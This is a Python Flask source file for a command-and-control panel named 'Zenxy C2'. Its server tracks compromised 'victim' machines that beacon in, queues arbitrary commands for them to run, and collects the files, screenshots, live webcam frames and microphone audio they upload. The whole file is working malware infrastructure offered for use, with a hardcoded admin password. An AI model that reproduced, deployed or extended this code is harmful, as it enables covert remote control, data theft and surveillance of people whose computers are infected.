# Zenxy C2 — full black/white panel
from flask import Flask, render_template, request, jsonify, session, redirect, url_for, send_file, Response
from functools import wraps
import secrets, time, base64, json
from io import BytesIO
from datetime import datetime

app = Flask(__name__)
app.secret_key = secrets.token_hex(32)

ADMIN_PASS = "zenxyadmin"
ONLINE_THRESHOLD = 90

agents = {}
tasks = {}
results = {}
files = {}
live_audio = {}  # agent_id -> last audio file_ids
live_frames = {}  # agent_id -> last image file_ids
logs = []

def login_required(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        if not session.get("logged_in"):
            return redirect(url_for("login"))
        return f(*args, **kwargs)
    return decorated

def mark_online():
    now = time.time()
    for a in agents.values():
        a["online"] = (now - a.get("last_seen", 0)) < ONLINE_THRESHOLD

def add_log(msg, level="info"):
    logs.insert(0, {"time": datetime.now().strftime("%H:%M:%S"), "msg": msg, "level": level})
    if len(logs) > 300:
        logs.pop()

# ---------- Auth ----------
@app.route("/login", methods=["GET", "POST"])
def login():
    if request.method == "POST":
        if request.form.get("password") == ADMIN_PASS:
            session["logged_in"] = True
            return redirect(url_for("dashboard"))
        return render_template("login.html", error="Wrong password")
    return render_template("login.html")

@app.route("/logout")
def logout():
    session.clear()
    return redirect(url_for("login"))

# ---------- Pages ----------
@app.route("/")
@login_required
def dashboard():
    mark_online()
    online = sum(1 for a in agents.values() if a.get("online"))
    return render_template("dashboard.html", agents=agents, online=online, total=len(agents), logs=logs[:20])

@app.route("/victim/<aid>")
@login_required
def victim(aid):
    mark_online()
    a = agents.get(aid)
    if not a:
        return redirect(url_for("dashboard"))
    return render_template("victim.html", agent=a, aid=aid)

@app.route("/logs")
@login_required
def logs_page():
    return render_template("logs.html", logs=logs)

# ---------- Agent API ----------
@app.route("/api/beacon", methods=["POST"])
def beacon():
    data = request.json or {}
    aid = data.get("id")
    if not aid:
        return jsonify({"error": "no id"}), 400
    prev = agents.get(aid, {})
    is_new = aid not in agents
    agents[aid] = {
        "id": aid,
        "hostname": data.get("hostname", "unknown"),
        "username": data.get("username", "unknown"),
        "os": data.get("os", "unknown"),
        "ip": request.headers.get("X-Forwarded-For", request.remote_addr),
        "last_seen": time.time(),
        "online": True,
        "first_seen": prev.get("first_seen", time.time()),
        "build": data.get("build", "?"),
        "privileges": data.get("privileges", "user"),
    }
    if is_new:
        add_log(f"New agent: {agents[aid]['hostname']} ({agents[aid]['username']})", "ok")
    pending = tasks.pop(aid, [])
    return jsonify({"tasks": pending})

@app.route("/api/result", methods=["POST"])
def result():
    data = request.json or {}
    tid = data.get("task_id")
    if not tid:
        return jsonify({"error": "no task_id"}), 400
    entry = {
        "output": data.get("output", ""),
        "type": data.get("type", "text"),
        "filename": data.get("filename"),
        "time": time.time(),
        "agent_id": data.get("agent_id"),
    }
    if data.get("type") in ("image", "file") and data.get("data"):
        fid = secrets.token_hex(8)
        files[fid] = {
            "name": data.get("filename", "file.bin"),
            "data": data["data"],
            "agent": data.get("agent_id"),
            "time": time.time(),
        }
        entry["file_id"] = fid
        aid = data.get("agent_id")
        if data.get("type") == "audio" and aid:
            live_audio.setdefault(aid, []).append(fid)
            live_audio[aid] = live_audio[aid][-30:]
        if data.get("type") == "image" and data.get("output") == "live-cam-frame" and aid:
            live_frames.setdefault(aid, []).append(fid)
            live_frames[aid] = live_frames[aid][-10:]
    results[tid] = entry
    add_log(f"Result {tid[:8]}… type={entry['type']}", "ok")
    return jsonify({"ok": True})

@app.route("/api/task", methods=["POST"])
@login_required
def create_task():
    data = request.json or {}
    aid = data.get("agent_id")
    cmd = data.get("cmd")
    if not aid or not cmd:
        return jsonify({"error": "missing"}), 400
    tid = secrets.token_hex(8)
    tasks.setdefault(aid, []).append({"id": tid, "cmd": cmd, "created": time.time()})
    add_log(f"Task → {aid[:8]}… : {cmd[:60]}", "info")
    return jsonify({"task_id": tid})

@app.route("/api/result/<tid>")
@login_required
def get_result(tid):
    r = results.get(tid)
    if not r:
        return jsonify({"status": "pending"})
    return jsonify({"status": "done", **r})

@app.route("/api/agents")
@login_required
def list_agents():
    mark_online()
    return jsonify(list(agents.values()))

@app.route("/api/file/<fid>")
@login_required
def get_file(fid):
    f = files.get(fid)
    if not f:
        return "Not found", 404
    data = base64.b64decode(f["data"])
    mime = "application/octet-stream"
    name = f["name"].lower()
    if name.endswith(".wav"): mime = "audio/wav"
    elif name.endswith((".jpg",".jpeg")): mime = "image/jpeg"
    elif name.endswith(".png"): mime = "image/png"
    elif name.endswith(".mp4"): mime = "video/mp4"
    return send_file(BytesIO(data), download_name=f["name"], mimetype=mime, as_attachment=not name.endswith((".wav",".jpg",".jpeg",".png")))

@app.route("/api/file/<fid>/view")
@login_required
def view_file(fid):
    f = files.get(fid)
    if not f:
        return "Not found", 404
    data = base64.b64decode(f["data"])
    mime = "image/jpeg" if f["name"].lower().endswith((".jpg", ".jpeg")) else "image/png"
    return Response(data, mimetype=mime)


@app.route("/api/live/<aid>/audio")
@login_required
def live_audio_api(aid):
    ids = live_audio.get(aid, [])
    return jsonify({"chunks": ids[-5:]})

@app.route("/api/live/<aid>/frames")
@login_required
def live_frames_api(aid):
    ids = live_frames.get(aid, [])
    return jsonify({"frames": ids[-3:]})

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8080)
